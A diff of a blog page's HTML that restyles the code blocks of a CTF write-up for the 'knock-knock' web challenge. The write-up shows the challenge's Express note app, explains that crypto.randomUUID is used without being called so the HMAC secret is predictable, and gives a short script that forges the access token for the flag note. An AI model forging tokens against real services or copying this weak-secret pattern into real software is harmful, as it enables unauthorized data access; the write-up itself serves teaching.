@@ -104,93 +104,93 @@ const crypto = require(&#39;crypto&#39;); class Database { constructor() { this.
 <p>After clicking the <code>create</code> button, it will redirect us to a page with an unique token that contains our paste:</p>
 <pre tabindex="0"><code>https://knock-knock.mc.ax/note?id=2249&amp;token=262fedf8ca783b2fd19c581064ab48511877fe2bff4f3ad79726c9ae8277cfd5
 </code></pre><p>Fortunately we have source code comes with this challenge:</p>
-<pre tabindex="0"><code>const crypto = require(&#39;crypto&#39;);
-
-class Database {
-  constructor() {
-    this.notes = [];
-    this.secret = `secret-${crypto.randomUUID}`;
-  }
-
-  createNote({ data }) {
-    const id = this.notes.length;
-    this.notes.push(data);
-    return {
-      id,
-      token: this.generateToken(id),
-    };
-  }
-
-  getNote({ id, token }) {
-    if (token !== this.generateToken(id)) return { error: &#39;invalid token&#39; };
-    if (id &gt;= this.notes.length) return { error: &#39;note not found&#39; };
-    return { data: this.notes[id] };
-  }
-
-  generateToken(id) {
-    return crypto
-      .createHmac(&#39;sha256&#39;, this.secret)
-      .update(id.toString())
-      .digest(&#39;hex&#39;);
-  }
-}
-
-const db = new Database();
-db.createNote({ data: process.env.FLAG });
-
-const express = require(&#39;express&#39;);
-const app = express();
-
-app.use(express.urlencoded({ extended: false }));
-app.use(express.static(&#39;public&#39;));
-
-app.post(&#39;/create&#39;, (req, res) =&gt; {
-  const data = req.body.data ?? &#39;no data provided.&#39;;
-  const { id, token } = db.createNote({ data: data.toString() });
-  res.redirect(`/note?id=${id}&amp;token=${token}`);
-});
-
-app.get(&#39;/note&#39;, (req, res) =&gt; {
-  const { id, token } = req.query;
-  const note = db.getNote({
-    id: parseInt(id ?? &#39;-1&#39;),
-    token: (token ?? &#39;&#39;).toString(),
-  });
-  if (note.error) {
-    res.send(note.error);
-  } else {
-    res.send(note.data);
-  }
-});
-
-app.listen(3000, () =&gt; {
-  console.log(&#39;listening on port 3000&#39;);
-});
-</code></pre><p>Looking at the source code, we can determine that the value of param <code>id</code> will increase by 1 everytime someone create a paste, while the token is created by using <code>crypto.createHmac()</code> with a secret key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Database</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">notes</span> <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`secret-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomUUID</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">createNote</span>({ <span style="color:#a6e22e">data</span> }) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">notes</span>.<span style="color:#a6e22e">length</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">notes</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">id</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">token</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">generateToken</span>(<span style="color:#a6e22e">id</span>),
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">getNote</span>({ <span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">token</span> }) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">token</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">generateToken</span>(<span style="color:#a6e22e">id</span>)) <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;invalid token&#39;</span> };
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">id</span> <span style="color:#f92672">&gt;=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">notes</span>.<span style="color:#a6e22e">length</span>) <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;note not found&#39;</span> };
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">notes</span>[<span style="color:#a6e22e">id</span>] };
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">generateToken</span>(<span style="color:#a6e22e">id</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">crypto</span>
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">secret</span>)
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">id</span>.<span style="color:#a6e22e">toString</span>())
+</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">digest</span>(<span style="color:#e6db74">&#39;hex&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Database</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">createNote</span>({ <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">urlencoded</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> }));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#e6db74">&#39;public&#39;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/create&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;no data provided.&#39;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">token</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">createNote</span>({ <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">toString</span>() });
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">`/note?id=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;token=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/note&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">token</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">note</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">getNote</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> parseInt(<span style="color:#a6e22e">id</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;-1&#39;</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">token</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">token</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>).<span style="color:#a6e22e">toString</span>(),
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">error</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;listening on port 3000&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>Looking at the source code, we can determine that the value of param <code>id</code> will increase by 1 everytime someone create a paste, while the token is created by using <code>crypto.createHmac()</code> with a secret key.</p>
 <p>It tooks me a while to actually notice where the vulnerability is. In fact, the vulnerability is hiding in this code:</p>
-<pre tabindex="0"><code>constructor() {
-    this.notes = [];
-    this.secret = `secret-${crypto.randomUUID}`;
-}
-</code></pre><p>The calling of <code>crypto.randomUUID</code> missing parentheses, it actually will always return the following on recommended version of nodejs:</p>
-<pre tabindex="0"><code>secret-function randomUUID(options) {
-  if (options !== undefined)
-    validateObject(options, &#39;options&#39;);
-  const {
-    disableEntropyCache = false,
-  } = options || {};
-
-  validateBoolean(disableEntropyCache, &#39;options.disableEntropyCache&#39;);
-
-  return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID();
-}
-</code></pre><h4 id="note-for-lower-version-of-nodejs-it-will-return-undefined-instead">Note: For lower version of nodejs, it will return <code>undefined</code> instead.</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">notes</span> <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`secret-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomUUID</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The calling of <code>crypto.randomUUID</code> missing parentheses, it actually will always return the following on recommended version of nodejs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">secret</span><span style="color:#f92672">-</span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">randomUUID</span>(<span style="color:#a6e22e">options</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">options</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">undefined</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">validateObject</span>(<span style="color:#a6e22e">options</span>, <span style="color:#e6db74">&#39;options&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">disableEntropyCache</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>  } <span style="color:#f92672">=</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">||</span> {};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">validateBoolean</span>(<span style="color:#a6e22e">disableEntropyCache</span>, <span style="color:#e6db74">&#39;options.disableEntropyCache&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">disableEntropyCache</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">getUnbufferedUUID</span>() <span style="color:#f92672">:</span> <span style="color:#a6e22e">getBufferedUUID</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="note-for-lower-version-of-nodejs-it-will-return-undefined-instead">Note: For lower version of nodejs, it will return <code>undefined</code> instead.</h4>
 <p>So the correct code should be <code>crypto.randomUUID()</code> to get the proper random secret. With that, I create a small script to generate URL of other paste, I assuming that the first paste <code>id=0</code> is the flag:</p>
-<pre tabindex="0"><code>const crypt = require(&#39;crypto&#39;);
-secret = `secret-${crypt.randomUUID}`;
-
-console.log(`https://knock-knock.mc.ax/note?id=0&amp;token=${crypt.createHmac(&#39;sha256&#39;, secret).update(&#39;0&#39;).digest(&#39;hex&#39;)}`);
-</code></pre><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`secret-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">crypt</span>.<span style="color:#a6e22e">randomUUID</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`https://knock-knock.mc.ax/note?id=0&amp;token=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">crypt</span>.<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#a6e22e">secret</span>).<span style="color:#a6e22e">update</span>(<span style="color:#e6db74">&#39;0&#39;</span>).<span style="color:#a6e22e">digest</span>(<span style="color:#e6db74">&#39;hex&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span></code></pre></div><p>Output:</p>
 <pre tabindex="0"><code>https://knock-knock.mc.ax/note?id=0&amp;token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264
 </code></pre><p>Flag:</p>
 <pre tabindex="0"><code>dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r}
